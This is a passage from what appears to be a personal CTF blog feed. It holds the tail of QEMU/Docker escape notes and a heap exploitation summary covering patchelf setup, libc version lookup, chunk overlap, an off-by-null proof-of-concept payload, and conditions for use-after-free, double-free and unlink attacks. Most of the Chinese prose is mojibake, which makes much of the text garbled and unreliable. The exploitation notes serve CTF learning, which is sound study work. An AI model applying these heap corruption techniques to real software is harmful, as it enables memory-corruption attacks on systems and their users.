<p><a href="https://docs.docker.com/desktop/wsl/">Installation: HOW to
use docker in WSL 2?</a></p>
<h2 id="utils">[1-2] Utils</h2>
<h3 id="å¸¸ç”¨å‘½ä»¤">[1-2-1] å¸¸ç”¨å‘½ä»¤</h3>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ­å»º docker ç¯å¢ƒ</span></span><br><span class="line"><span class="comment"># ä»¥ä¸‹ä¸‰æ¡å‘½ä»¤å‡åœ¨ docker-compose.yml åŒç›®å½•ä¸‹æ‰§è¡Œ</span></span><br><span class="line">docker-compose build</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯åŠ¨ docker å®¹å™¨</span></span><br><span class="line">docker-compose up</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…³é—­ docker å®¹å™¨</span></span><br><span class="line">docker-compose down</span><br><span class="line"></span><br><span class="line"><span class="comment"># è‹¥å·²ç»æ‰§è¡Œ docker-compose build</span></span><br><span class="line"><span class="comment"># åˆ™å¯ä»¥åœ¨ä»»æ„ç›®å½•æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹å®¹å™¨</span></span><br><span class="line">docker ps -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯åŠ¨å®¹å™¨</span></span><br><span class="line">docker start å®¹å™¨ID/åç§°</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿›å…¥å®¹å™¨</span></span><br><span class="line">docker <span class="built_in">exec</span> -ti å®¹å™¨ID /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»ä¸»æœºæ‹·è´åˆ° docker</span></span><br><span class="line">docker <span class="built_in">cp</span> /path/to/rootfs.cpio &lt;container_name_or_id&gt;:/tmp/rootfs.cpio</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…³é—­å®¹å™¨</span></span><br><span class="line">docker stop å®¹å™¨ID/åç§°</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¸…ç†ä¸éœ€è¦çš„ images</span></span><br><span class="line">docker system <span class="built_in">df</span>   <span class="comment"># æŸ¥çœ‹ docker å ç”¨ç©ºé—´</span></span><br><span class="line">docker image prune <span class="comment"># æ¸…ç†æœªè¢«ä»»ä½•å®¹å™¨ä½¿ç”¨çš„é•œåƒ</span></span><br></pre></td></tr></table></figure>
<h1 id="qemu">[2] QEMU</h1>
<h2 id="args">[2-1] Args</h2>
<ol type="1">
<li><p><code>qemu-system-x86_64 -help</code></p></li>
<li><p><a
href="https://www.qemu.org/docs/master/system/introduction.html">å®˜æ–¹
docs</a></p></li>
<li><p>GPT</p></li>
</ol>
<h1 id="escape">[3] Escape</h1>
<h2 id="é˜…è¯»dockerfile">[3-1] é˜…è¯»Dockerfile</h2>
<h2 id="ç¡®è®¤å­˜åœ¨æ¼æ´çš„è®¾å¤‡">[3-2] ç¡®è®¤å­˜åœ¨æ¼æ´çš„è®¾å¤‡</h2>
<p>QEMU é€ƒé€¸çš„é¢˜ç›®ä¸€èˆ¬éƒ½æ˜¯é€šè¿‡æŸä¸ªè®¾å¤‡çš„è¯»å†™æ¥è¿›è¡Œï¼Œæˆ‘ä»¬éœ€è¦æŸ¥çœ‹å¯åŠ¨
qemu æ—¶ -device å‚æ•°æ˜¯ä»€ä¹ˆï¼Œä»è€Œç¡®å®šè®¾å¤‡åç§°</p>
<h2 id="section">[3-3]</h2>
<h1 id="nan-reference">[NaN] REFERENCE</h1>
<p><a
href="https://www.cnblogs.com/LynneHuan/p/17822138.html">ä½¿ç”¨dockerè°ƒè¯•å’Œéƒ¨ç½²pwné¢˜</a></p>
<p><a
href="https://zhuanlan.zhihu.com/p/614513965">å®¸æå®éªŒå®¤â€”ã€æ‚é¡¹ã€Docker
é€ƒé€¸æ–¹æ³•æ±‡æ€»</a></p>
<p><a href="https://l0tus.vip/cn/qemu_escape/">qemu_escape by
I0tus</a></p>
<p><a
href="http://www.cynosure.top/2022/01/25/RWCTF2022-be-a-docker-escaper/">RWCTF
2022</a></p>
<p><a
href="https://pig-007.github.io/2021/08/14/qemu%E9%80%83%E9%80%B8-pwn%E8%A7%A3%E9%A2%98/">QEMUæ¼æ´è¯¦ç»†åˆ†æ
PIG007</a></p>
<p><a
href="https://eqqie.cn/index.php/archives/1834">ç»å…¸é¢˜å‹å­˜æ¡£</a></p>
<p><a href="https://www.jianshu.com/p/f08e34cf08ad">è°ƒè¯• ä¸
exp.pyä¼ è¿œç¨‹</a></p>
<p><a
href="https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/">ä¸é™„åŠ expçš„è°ƒè¯•</a></p>
<p><a
href="https://www.anquanke.com/post/id/254906">å¾ˆå¥½çš„åˆ†ææ–‡ç« </a></p>
<p><a
href="https://www.giantbranch.cn/2020/01/15/CTF%20QEMU%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/">å¥½å¤šé¢˜å¥½å¤šé¢˜å¥½å¤šé¢˜</a></p>
<p><a
href="https://xz.aliyun.com/t/5773?time__1311=n4%2BxnD07DtKxyjFD%2FiTY8xmx7u4Wuq0QYeY4D&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F">æ¯”è¾ƒé«˜çº§çš„åˆ©ç”¨æ–¹å¼</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/57526565">å‡ºé¢˜</a></p>
]]></content>
      <categories>
        <category>CTF_Theory</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>QEMU escape</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - Heap Exploit Summary</title>
    <url>/2024/02/07/Pwn%20-%20Heap%20Exploit%20Summary/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
æ€»ç»“ä¸€ä¸‹ Heap çš„ç›¸å…³å†…å®¹ï¼Œä¾¿äºåç»­è°ƒç”¨
</blockquote>
<span id="more"></span>
<p><a href="https://github.com/iromise/glibc/tree/master/malloc">Github:
ptmalloc æºç (åªæœ‰ malloc éƒ¨åˆ†)</a></p>
<p><a href="https://www.jianshu.com/p/1a966b62b3d4">source code
compilation &amp;&amp; all libc debs</a></p>
<h1 id="ç›®å½•">[0] ç›®å½•</h1>
<ol type="1">
<li><a href="#1-patchelfçš„ä½¿ç”¨æ–¹å¼">Patchelfçš„ä½¿ç”¨æ–¹å¼</a></li>
<li><a href="#2-è¯¦è§£-ç”³è¯·ä¸é‡Šæ”¾-chunkæœªå®Œæˆ">è¯¦è§£ 'ç”³è¯·ä¸é‡Šæ”¾
chunk'</a></li>
<li><a href="#3-chunk-extend-and-overlapping">chunk Extend and
Overlapping</a></li>
<li><a href="#4-use-after-free">Use After Free</a></li>
<li><a href="#5-double-free">Double Free</a></li>
<li><a href="#6-unlink">Unlink</a></li>
<li><a href="#7-series-of-bin">Series of Bin</a>
<ul>
<li><a href="#7-1-tcachebin">7-1 Tcachebin</a></li>
<li><a href="#7-2-fastbin">7-2 Fastbin</a></li>
<li><a href="#7-3-unsortedbin">7-3 Unsortedbin</a></li>
<li><a href="#7-4-largebin-attack">7-4 Largebin Attack</a></li>
</ul></li>
<li><a href="#8-series-of-house">Series of House</a>
<ul>
<li><a href="#8-1-house-of-orange">8-1 House of Orange</a></li>
<li><a href="#8-2-house-of-force-hof">8-2 House of Force</a></li>
<li><a href="#8-3-house-of-botcake">8-3 House of botcake</a></li>
<li><a href="#8-4-house-of-banana">8-4 House of banana</a></li>
<li><a href="#8-5-house-of-pig">8-5 House of pig</a></li>
</ul></li>
</ol>
<h1 id="patchelfçš„ä½¿ç”¨æ–¹å¼">[1] Patchelfçš„ä½¿ç”¨æ–¹å¼</h1>
<blockquote>
<p>åœ¨æœ¬åœ°è°ƒè¯•å †é¢˜æ—¶ï¼Œä¸åŒçš„ libc ç‰ˆæœ¬ä¼šæœ‰ä¸åŒçš„ heap ç®¡ç†å™¨æ¥ç®¡ç†
heapï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å°†æœ¬åœ°çš„ elf æ–‡ä»¶çš„é“¾æ¥éƒ¨åˆ† patch
ä¸€ä¸‹ï¼Œä½¿å…¶ä¸è¿œç¨‹é“¾æ¥çš„ libc æ–‡ä»¶ä¿æŒä¸€è‡´ã€‚</p>
</blockquote>
<h2 id="ç¡®è®¤libc">[1-1] ç¡®è®¤libc</h2>
<blockquote>
<p>æœ‰æ—¶é¢˜ç›®åªç»™ä¸€ä¸ª libc.so.6ï¼Œæ­¤æ—¶ patchelf åç¨‹åºä¼šå› ä¸ºç¼ºå°‘ ld
æ–‡ä»¶è€Œæ— æ³•æ­£å¸¸è¿è¡Œï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦é€šè¿‡è¿™ä¸ª libc.so.6 æ¥ç¡®è®¤ç¨‹åºä½¿ç”¨çš„ libc
ç‰ˆæœ¬ï¼Œç„¶åè‡ªå·±ä¸‹è½½å¯¹åº” libc åŒ…å¹¶ patch</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">puts_offset = libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_offset = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">printf_offset = libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_offset      ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(puts_offset))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;read_offset     ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(read_offset))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;printf_offset   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(printf_offset))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">puts_offset     ---&gt;    0x84420</span></span><br><span class="line"><span class="string">read_offset     ---&gt;    0x10dfc0</span></span><br><span class="line"><span class="string">printf_offset   ---&gt;    0x61c90</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># puts    ---&gt;    420</span></span><br><span class="line"><span class="string"># read    ---&gt;    fc0</span></span><br><span class="line"><span class="string"># printf  ---&gt;    c90</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>å°†æ‰“å°å‡ºæ¥çš„ä¸‰ä¸ªåç§»é‡çš„åä¸‰ä½ï¼Œæ‹¿åˆ° <a
href="https://libc.blukat.me/?q=puts%3A420%2Cread%3Afc0%2Cprintf%3Ac90">libcSearcher</a>
å»æŸ¥å³å¯</p>
<h2 id="libc-åŒ…çš„ä¸‹è½½">[1-2] libc åŒ…çš„ä¸‹è½½</h2>
<p>patchelfæ²¡æœ‰çš„åŒ…å¯ä»¥åœ¨<a
href="https://www.jianshu.com/p/1a966b62b3d4">è¿™é‡Œ</a>ä¸‹è½½</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ä»¥ä¸‹æ“ä½œå‡åœ¨æ–‡ä»¶å¤¹ glibc-all-in-one ä¸­å®Œæˆ</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æŸ¥çœ‹æœ‰ä»€ä¹ˆç‰ˆæœ¬çš„ libc å¯ä»¥ä¸‹è½½</span></span><br><span class="line">./update_list // æ›´æ–° list</span><br><span class="line">cat list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ä¸‹è½½æ‰€éœ€è¦çš„ libc åŒ…</span></span><br><span class="line">./download 2.35-0ubuntu3_amd64</span><br></pre></td></tr></table></figure>
<blockquote>
<p>æœ‰æ—¶æˆ‘ä»¬éœ€è¦çš„ libc åŒ…ä¸åœ¨ list
ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå·±å°è¯•è§£æ„å‘½ä»¤æ¥ä¸‹è½½ã€‚</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">è®¿é—®https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/ï¼ŒæŸ¥çœ‹æ‰€æœ‰å¯ä»¥ä¸‹è½½çš„ libc ç‰ˆæœ¬</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/ ä¹Ÿå¯ä»¥</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ä¸‹è½½å‹ç¼©åŒ…(åˆ°æ–‡ä»¶å¤¹glibc-all-in-one/debs)ä»¥åç”¨ extract å‘½ä»¤è§£å‹ç¼©</span></span><br><span class="line">./extract debs/libc6_2.26-0ubuntu2_i386.deb /tmp/test</span><br></pre></td></tr></table></figure>
<h2 id="patch-elfæ–‡ä»¶">[1-3] patch elfæ–‡ä»¶</h2>
<blockquote>
<p>è¯†åˆ«éœ€è¦ patch çš„æ–‡ä»¶ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[path/to/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64]</span><br><span class="line">â””â”€$ ls</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">æ‰¾åˆ°ä»¥ä¸‹æ–‡ä»¶</span><br><span class="line">ld-linux-x86-64.so.2  # ld-2.23.so ä¹Ÿè¡Œ</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>tip1ï¼šé«˜ç‰ˆæœ¬çš„libcåº“æ²¡æœ‰ <code>ld-2.23.so</code> è¿™ç§æ–‡ä»¶ï¼Œä½†å®ƒä¸
<code>ld-linux-x86-64.so.2</code>
ç­‰ä»·ï¼Œéƒ½æŒ‡å‘ç›¸åŒçš„åŠ¨æ€é“¾æ¥å™¨æ–‡ä»¶ï¼Œä»–ä»¬å®é™…ä¸Šæ˜¯åŒä¸€ä¸ªæ–‡ä»¶çš„ä¸åŒåç§°ã€‚</p>
<p>tip2ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">è¢«patchçš„elfæ–‡ä»¶: Pwn</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">é…ç½®åŠ¨æ€é“¾æ¥å™¨ ld.so</span></span><br><span class="line">patchelf --set-interpreter /mnt/e/EdgeDownload/libcTools/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-linux-x86-64.so.2 pwn </span><br><span class="line">patchelf --set-interpreter ./ld-linux-x86-64.so.2 pwn </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">é…ç½®é“¾æ¥åº“</span> </span><br><span class="line">patchelf --set-rpath  /mnt/e/EdgeDownload/libcTools/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ pwn</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">é…ç½®åŠ¨æ€é“¾æ¥å™¨ä¸åŠ¨æ€é“¾æ¥åº“</span></span><br><span class="line">patchelf --set-interpreter /mnt/e/EdgeDownload/libcTools/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-2.23.so --replace-needed libc.so.6 /mnt/e/EdgeDownload/libcTools/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6 pwn</span><br><span class="line">patchelf --set-interpreter ./ld-2.23.so --replace-needed libc.so.6 ./libc.so.6 pwn</span><br></pre></td></tr></table></figure>
<h2 id="æ¢å¤-debug-symbol">[1-4] æ¢å¤ debug symbol</h2>
<h3 id="patchelf-list-ä¸­æœ‰ç›¸å…³åŒ…">[1-4-1] patchelf list ä¸­æœ‰ç›¸å…³åŒ…</h3>
<blockquote>
<p>å…¶å®æ²¡æœ‰ç›¸å…³åŒ…çš„è¯ç”¨æœ€è¿‘ç‰ˆæœ¬çš„ libc ä¹Ÿèƒ½.debug</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ä¸‹è½½å¯¹åº” libc åŒ…</span></span><br><span class="line">./download xxx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¤åˆ¶ /libs/2.xx-xubuntuxx_xxx/.debug/.build-id çš„ç»å¯¹è·¯å¾„ï¼Œåœ¨gdbæ—¶</span></span><br><span class="line">loadfolder /path/to/libs/2.xx-xubuntuxx_xxx/.debug/.build-id</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¦‚æœ download æ‹‰ä¸ä¸‹æ¥ï¼Œå»å¯¹åº”ç½‘ç«™æ‰¾å¸¦dbgï¼ˆå¦‚libc6-dbg_2.23-0ubuntu3_i386.debï¼‰çš„åŒ…ä¸‹è½½ä¸‹æ¥ï¼Œå°†/data/usr/lib/debug/.build-idå¤åˆ¶åˆ° /libs/2.xx-xubuntuxx_xxx/.debug ä¸‹å³å¯</span></span><br></pre></td></tr></table></figure>
<h3 id="list-ä¸­æ²¡æœ‰ç›¸å…³åŒ…">[1-4-2] list ä¸­æ²¡æœ‰ç›¸å…³åŒ…</h3>
<p>æŸ¥çœ‹<a
href="https://www.jianshu.com/p/1a966b62b3d4">è¿™ä¸ªæ•™ç¨‹</a>ç¼–è¯‘æºç æ¥æ¢å¤ç¬¦å·</p>
<p><a href="https://www.cnblogs.com/LynneHuan/p/17822138.html">docker
æ¢å¤ç¬¦å·</a></p>
<h2 id="æ¢å¤æºç ä¸patchelfå…³ç³»ä¸å¤§">[1-5]
æ¢å¤æºç (ä¸patchelfå…³ç³»ä¸å¤§)</h2>
<p><a href="https://zhuanlan.zhihu.com/p/65873040">çœ‹è¿™ç¯‡</a></p>
<h1 id="è¯¦è§£-ç”³è¯·ä¸é‡Šæ”¾-chunkæœªå®Œæˆ">[2] è¯¦è§£ 'ç”³è¯·ä¸é‡Šæ”¾
chunk'(æœªå®Œæˆ)</h1>
<h2 id="ç”³è¯·-chunk">[2-1] ç”³è¯· chunk</h2>
<ol start="0" type="1">
<li><p>å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡ç”³è¯·ï¼Œåˆ™ malloc ä¸€å—å†…å­˜æ¥å­˜æ”¾
<code>tcache_perthread_struct</code></p></li>
<li><p>æŸ¥çœ‹è¦ç”³è¯·çš„ chunk çš„å¤§å°ï¼Œè®°ä½œ <code>SIZE</code></p></li>
<li><p>æ£€æŸ¥å„ç§ bin</p>
<ol type="1">
<li>(libc2.26åŠä¹‹å) <code>SIZE</code> å±äº [0x0,small bin size)ï¼Œæ£€æŸ¥
tcachebinï¼Œæœ‰åˆé€‚çš„ chunk åˆ™è¿”å›</li>
<li>æ ¹æ®ç‰ˆæœ¬æœ‰ä¸åŒé€‰æ‹©
<ol type="1">
<li>(libc2.26ä¹‹å‰)<code>SIZE</code> å±äº [0x0,0x78]ï¼Œæ£€æŸ¥
fastbinsï¼Œæœ‰åˆé€‚çš„ chunk åˆ™æ£€æŸ¥ size åŸŸæ˜¯å¦æ­£ç¡®ï¼Œæ­£ç¡®åˆ™è¿”å›</li>
<li>(libc2.26åŠä¹‹å)<code>SIZE</code> å±äº [0x0,0x78]ï¼Œå°†å¯¹åº” fastbin
ä¸€æ•´æ¡é“¾æŒªè¿› tcachebin çš„å¯¹åº”é“¾ä¸Šï¼Œå¹¶å–å‡º newest_chunk è¿”å›</li>
</ol></li>
<li>smallBin largeBin è¿˜æ²¡å­¦</li>
<li>æ£€æŸ¥ unsortedBinï¼Œå¦‚æœ <code>SIZE</code> å°äº "unsortedbin çš„æŸä¸ª
chunk çš„ size"ï¼Œåˆ™:
<ol type="1">
<li>ä»¥0x10ä¸ºåŸºæœ¬å•ä½åˆ‡å‰²å‡ºç”³è¯·çš„ chunk å¹¶è¿”å›ï¼Œå‰©ä¸‹çš„éƒ¨åˆ†å«åš last
remainder chunk</li>
</ol></li>
</ol></li>
<li><p>æ£€æŸ¥ topchunkï¼Œå¦‚æœ <code>SIZE</code> å°äº "topchunk çš„
size"ï¼Œåˆ™:</p>
<ol type="1">
<li>ä»¥0x10ä¸ºåŸºæœ¬å•ä½åˆ‡å‰²å‡ºç”³è¯·çš„ chunk å¹¶è¿”å›</li>
</ol></li>
<li><p>ç”¨ Brk å†æ‹‰å‡ é¡µå†…å­˜å‡ºæ¥ï¼Œè¿˜æ²¡å­¦</p></li>
</ol>
<h2 id="é‡Šæ”¾-chunk">[2-2] é‡Šæ”¾ chunk</h2>
<ol type="1">
<li>æŸ¥çœ‹è¦é‡Šæ”¾çš„ chunk çš„å¤§å°ï¼Œè®°ä½œ<code>SIZE</code></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># çŒœæµ‹ï¼Œå°šä¸ç¡®å®š</span><br><span class="line">n. æ£€æŸ¥ prev_inuse ä½ï¼Œè‹¥ä¸º0ï¼Œåˆ™:  </span><br><span class="line">    1. å¦‚æœ chunk ä¸åœ¨ fastbin/tcachebinï¼Œåˆ™å‰å‘åˆå¹¶ï¼Œå¹¶ç»§ç»­é€’å½’æ£€éªŒ prev_inuse</span><br><span class="line">    2. å¦‚æœ chunk åœ¨ fastbin/tcachebinï¼Œåˆ™è·å–å‰ä¸€ä¸ª chunk çš„ sizeï¼Œå¹¶å­˜åˆ° prev_size åŸŸ</span><br></pre></td></tr></table></figure>
<h1 id="chunk-extend-and-overlapping">[3] chunk Extend and
Overlapping</h1>
<h2 id="åˆ†ç±»">[3-1] åˆ†ç±»</h2>
<p>æœ¬è´¨æ˜¯é€šè¿‡ä¿®æ”¹ chunk_header æ¥å®ç°ç”¨ chunk1 æ§åˆ¶ chunk2
çš„å†…å®¹çš„æ•ˆæœã€‚åˆ†ä¸ºå‰å‘å’Œåå‘ä¸¤ç§</p>
<h3 id="åå‘-overlap">[3-1-1] åå‘ Overlap</h3>
<p>å †åŒºæ¨¡å‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---chunk1(0x21)---</span><br><span class="line">---chunk2(0x21)---</span><br></pre></td></tr></table></figure></p>
<p>æœ¬è´¨ï¼šä¿®æ”¹ä½åœ°å€ chunk1 çš„ size åŸŸï¼Œåœ¨ä¿®æ”¹ chunk1 å†…å®¹æ—¶ä¼šè¶Šç•Œä¿®æ”¹æ‰
chunk2 çš„å†…å®¹</p>
<h3 id="å‰å‘-overlap">[3-1-2] å‰å‘ Overlap</h3>
<p>å †åŒºæ¨¡å‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---chunk1(0x81)---</span><br><span class="line">---chunk2(0x21)---</span><br><span class="line">---chunk3(0x21)---</span><br><span class="line">---chunk4(0x81)---</span><br><span class="line">---chunk5(0x21)---é˜²æ­¢ top_chunk åˆå¹¶</span><br></pre></td></tr></table></figure></p>
<p>æœ¬è´¨ï¼šä¿®æ”¹é«˜åœ°å€ chunk4 çš„ pre_inuse åŸŸå’Œ prev_size åŸŸï¼Œé€šè¿‡ free æ—¶
bins çš„æœºåˆ¶æ¥è¿›è¡Œå‰å‘åˆå¹¶ chunk1 ï¼Œä»è€Œå†æ¬¡ malloc æ—¶å¯ä»¥æ§åˆ¶ä¸­é—´çš„
chunk2 ä¸ chunk3</p>
<h2 id="å…·ä½“åˆ©ç”¨æ‰‹æ³•">[3-2] å…·ä½“åˆ©ç”¨æ‰‹æ³•</h2>
<h3 id="off-by-null">[3-2-1] off-by-null</h3>
<h4 id="æ¦‚è¿°">[3-2-1-1] æ¦‚è¿°</h4>
<p><code>off-by-null</code>
æŒ‡çš„æ˜¯ç¨‹åºåœ¨å†™å…¥å †çš„æ—¶å€™ï¼Œä¼šåœ¨è¾“å…¥å­—ç¬¦çš„æœ€åç”¨<code>'\x00'</code>æˆªæ–­</p>
<p>é€šè¿‡ç”³è¯· xxx8h å¤§å°çš„ chunkï¼Œå½“æˆ‘ä»¬è¾“å…¥ xxx8 ä¸ªå­—èŠ‚æ—¶ï¼Œç¨‹åºä¼šå°†ä¸‹ä¸€ä¸ª
chunk çš„ size åŸŸçš„ä½ä¸€ä¸ªå­—èŠ‚è¦†ç›–ä¸º0ï¼Œ</p>
<p>è¿™æ ·çš„æ“ä½œä¼šè®© prev_inuse ä½ç½®é›¶ï¼Œä½¿ç¨‹åºè¯¯ä»¥ä¸ºå‰ä¸€ä¸ª chunk
å·²ç»è¢«é‡Šæ”¾ï¼Œä»è€Œä¸å‰ n ä¸ª chunk å‘ç”Ÿåˆå¹¶</p>
<h4 id="poc">[3-2-1-2] POC</h4>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x80</span>) <span class="comment"># 0 0x91 </span></span><br><span class="line">alloc(<span class="number">0x18</span>) <span class="comment"># 1 0x21</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment"># 2 0x91</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment"># 3 0x21 é˜²æ­¢åˆå¹¶</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xb0</span>) <span class="comment"># 0x20 + 0x90 = 0xb0</span></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># show(0) å¯ä»¥ leak main_arena</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># alloc(4,0xa0) å¯ä»¥åˆ‡å‰² chunk0-chunk2ï¼Œä»è€Œä¿®æ”¹ chunk1ï¼Œ</span></span><br><span class="line"><span class="comment"># è¿›è€Œé€ æˆ tcachebin poisoning / fastbin attack</span></span><br></pre></td></tr></table></figure>
<h1 id="use-after-free">[4] Use After Free</h1>
<h2 id="æ¦‚è¿°-1">[4-1] æ¦‚è¿°</h2>
<blockquote>
<p>libc2.26 - libc2.31ï¼Œä¸»è¦æ˜¯ tcachebin UAF</p>
</blockquote>
<p>è§ Kinds of Bin -&gt; Tcachebin -&gt; UAF</p>
<h1 id="double-free">[5] Double Free</h1>
<h2 id="æ¦‚è¿°-2">[5-1] æ¦‚è¿°</h2>
<blockquote>
<p>libc2.27ä¹‹å‰ï¼Œä¸»è¦æ˜¯ fastbin double free</p>
</blockquote>
<p>è§ Kinds of Bin -&gt; Fastbin</p>
<blockquote>
<p>libc2.27-2.28ï¼Œä¸»è¦æ˜¯ tcachebin double free</p>
</blockquote>
<blockquote>
<p>libc2.29-libc2.31ï¼ŒtcachebinåŠ å…¥äº†æ£€æŸ¥æœºåˆ¶ï¼Œæ‰€ä»¥ä»ç„¶è€ƒè™‘ç”¨
fastbin/smallbin</p>
</blockquote>
<p>è§ Kinds of Bin -&gt; Tcachebin</p>
<h1 id="unlink">[6] Unlink</h1>
<h2 id="åˆ©ç”¨æ¡ä»¶">[6-1] åˆ©ç”¨æ¡ä»¶</h2>
<ol type="1">
<li><p>free çš„ <code>chunkC</code> å‰å chunk çš„ fd/bk å¯ä»¥è¢«ä¿®æ”¹</p>
<ol type="1">
<li><p>UAFï¼Œfree ä»¥åä¿®æ”¹ fd/bk</p></li>
<li><p>å †æº¢å‡ºï¼Œä¼ªé€  chunkï¼Œä¿®æ”¹ fd/bk çš„åŒæ—¶ä¿®æ”¹ <code>chunk</code> çš„
prev_size å’Œ prev_inuse</p></li>
</ol></li>
<li><p>æ²¡è§è¿‡å¤ªå¤šæ¡ˆä¾‹ä¸å¤ªä¼šæ¦‚æ‹¬è¿™ä¸€ç‚¹</p>
<ol type="1">
<li>pie æ²¡å¼€ï¼Œbss æ®µçš„ heap_list å¯ä»¥è¢«æ‹¿æ¥å½“åš fd/bk</li>
</ol></li>
</ol>
<h2 id="åŸç†">[6-2] åŸç†</h2>
<p>ctfwiki ä¸Šçš„ FD BK fd bk æ„Ÿè§‰å†™çš„ä¹±ä¸ƒå…«ç³Ÿçš„ï¼Œé‡æ–°æ•´ç†ä¸€ä¸‹æ€è·¯</p>
<p>unlink æ¦‚æ‹¬æ¥è®²ï¼Œå°±æ˜¯åˆ©ç”¨ free
æ—¶çš„æœºåˆ¶ï¼Œå®ç°ä»»æ„åœ°å€å†™éä»»æ„å€¼çš„æŠ€æœ¯</p>
<h3 id="è§¦å‘-unlink">[6-2-1] è§¦å‘ unlink</h3>
<ol type="1">
<li><p>åœ¨é‡Šæ”¾ size å¤§äº smallbin æœ€å°å€¼çš„ chunkC æ—¶ï¼Œptmalloc ä¼šæ£€æŸ¥
chunkC ç‰©ç†ç›¸é‚»çš„å‰åä¸¤ä¸ª chunk
æ˜¯å¦æ­£åœ¨è¢«ä½¿ç”¨ï¼Œå¦‚æœæ²¡è¢«ä½¿ç”¨ï¼Œåˆ™ä¼šè§¦å‘å‰å‘/åå‘åˆå¹¶ï¼Œä»è€Œè§¦å‘ unlink</p>
<ol type="1">
<li><p>å‰å‘åˆå¹¶ï¼šchunkC çš„ prev_size ä¸ºå‰ä¸€ä¸ª chunk çš„ sizeï¼Œä¸” chunkC
çš„ prev_inuse ä½ç½®é›¶</p></li>
<li><p>åå‘åˆå¹¶ï¼šchunkC çš„åä¸€ä¸ª chunk å·²ç»åœ¨ binlist å½“ä¸­</p></li>
</ol></li>
</ol>
